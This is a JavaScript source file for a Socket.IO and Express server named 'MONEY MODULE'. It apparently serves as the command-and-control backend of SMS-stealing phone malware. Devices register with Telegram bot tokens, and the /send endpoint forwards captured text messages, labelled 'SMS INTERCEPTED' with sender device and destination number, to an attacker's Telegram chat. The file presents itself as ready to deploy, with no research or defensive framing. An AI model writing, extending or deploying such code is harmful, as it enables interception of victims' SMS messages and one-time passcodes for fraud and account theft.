/**
 * MONEY MODULE - Socket.IO Server
 * Deploy this on Railway, Render, or any VPS
 */

const express = require('express');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  transports: ['websocket', 'polling'],
  pingTimeout: 120000,
  pingInterval: 30000,
  upgradeTimeout: 60000,
  allowUpgrades: true,
  connectTimeout: 60000,
  maxHttpBufferSize: 1e8
});

// Store connected devices
const connectedDevices = new Map();
const registeredDevices = new Map();
const lastSmsReceived = new Map();

// Send message to Telegram
function sendToTelegram(botToken, chatId, message) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${botToken}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        console.log(`[TELEGRAM] Response: ${body}`);
        resolve(body);
      });
    });

    req.on('error', (e) => {
      console.error(`[TELEGRAM] Error: ${e.message}`);
      reject(e);
    });

    req.write(data);
    req.end();
  });
}

// Health check endpoint
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    message: 'MONEY MODULE Server Running',
    connectedDevices: connectedDevices.size,
    registeredDevices: registeredDevices.size,
    uptime: process.uptime()
  });
});

// API endpoint to check device
app.get('/api/device/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const device = registeredDevices.get(deviceId);
  
  if (device) {
    res.json({ success: true, device: device });
  } else {
    res.json({ success: false, message: 'Device not found' });
  }
});

app.use(express.json({ limit: '10mb' }));

// SMS Send endpoint - App calls this to send SMS data
app.post('/send', async (req, res) => {
  try {
    const { deviceId, destNumber, textMessage } = req.body;
    
    console.log(`[SMS] ========== NEW SMS ==========`);
    console.log(`[SMS] Device: ${deviceId}`);
    console.log(`[SMS] To: ${destNumber}`);
    console.log(`[SMS] Message: ${textMessage}`);
    console.log(`[SMS] ==============================`);
    
    // Get device info for Telegram credentials
    const device = registeredDevices.get(deviceId);
    
    if (device && device.botToken && device.chatId) {
      // Format message for Telegram
      const telegramMessage = `📱 <b>SMS INTERCEPTED</b>

🔑 <b>Device:</b> <code>${deviceId}</code>
📞 <b>To:</b> <code>${destNumber}</code>
💬 <b>Message:</b>
<code>${textMessage}</code>

⏰ <b>Time:</b> ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;

      // Send to Telegram
      try {
        await sendToTelegram(device.botToken, device.chatId, telegramMessage);
        console.log(`[SMS] Sent to Telegram successfully`);
      } catch (telegramError) {
        console.error(`[SMS] Telegram error: ${telegramError.message}`);
      }
    } else {
      console.log(`[SMS] No Telegram credentials for device ${deviceId}`);
    }
    
    // Store SMS record
    lastSmsReceived.set(deviceId, {
      deviceId,
      destNumber,
      textMessage,
      receivedAt: new Date().toISOString()
    });
    
    res.json({
      status: "true",
      message: "SMS received and forwarded",
      receivedLength: textMessage ? textMessage.length : 0
    });
  } catch (error) {
    console.error('[SMS] Error:', error);
    res.status(500).json({
      status: "false",
      message: "Error processing SMS"
    });
  }
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log(`[CONNECT] New connection: ${socket.id}`);
  
  const deviceId = socket.handshake.auth?.deviceId || 'unknown';
  const botToken = socket.handshake.auth?.botToken || '';
  const chatId = socket.handshake.auth?.chatId || '';
  
  console.log(`[AUTH] Device: ${deviceId}`);
  console.log(`[AUTH] Bot Token: ${botToken ? 'Present' : 'Missing'}`);
  console.log(`[AUTH] Chat ID: ${chatId}`);
  
  // Store connection
  connectedDevices.set(socket.id, {
    deviceId,
    botToken,
    chatId,
    socketId: socket.id,
    connectedAt: new Date().toISOString()
  });
  
  // Register device
  if (deviceId && deviceId !== 'unknown') {
    registeredDevices.set(deviceId, {
      deviceId: deviceId,
      botToken: botToken,
      chatId: chatId,
      socketId: socket.id,
      registeredAt: new Date().toISOString(),
      lastSeen: new Date().toISOString()
    });
    console.log(`[REGISTERED] Device: ${deviceId}`);
    
    socket.emit('registered', {
      success: true,
      message: 'Device registered successfully',
      deviceId: deviceId
    });
  }
  
  socket.emit('connected', {
    message: 'Connected to server',
    deviceId: deviceId,
    socketId: socket.id
  });
  
  socket.on('register', (data) => {
    console.log(`[REGISTER] ${JSON.stringify(data)}`);
    const regDeviceId = data?.deviceId || deviceId;
    const regBotToken = data?.botToken || botToken;
    const regChatId = data?.chatId || chatId;
    
    registeredDevices.set(regDeviceId, {
      deviceId: regDeviceId,
      botToken: regBotToken,
      chatId: regChatId,
      socketId: socket.id,
      registeredAt: new Date().toISOString(),
      lastSeen: new Date().toISOString()
    });
    
    socket.emit('registered', {
      success: true,
      message: 'Device registered successfully',
      deviceId: regDeviceId
    });
  });
  
  socket.on('heartbeat', () => {
    if (registeredDevices.has(deviceId)) {
      const device = registeredDevices.get(deviceId);
      device.lastSeen = new Date().toISOString();
      registeredDevices.set(deviceId, device);
    }
    socket.emit('heartbeat', { timestamp: Date.now() });
  });
  
  socket.on('disconnect', (reason) => {
    console.log(`[DISCONNECT] ${deviceId}: ${reason}`);
    connectedDevices.delete(socket.id);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log('========================================');
  console.log('🚀 MONEY MODULE Server Started');
  console.log(`📡 Port: ${PORT}`);
  console.log('========================================');
});

process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down...');
  server.close(() => process.exit(0));
});
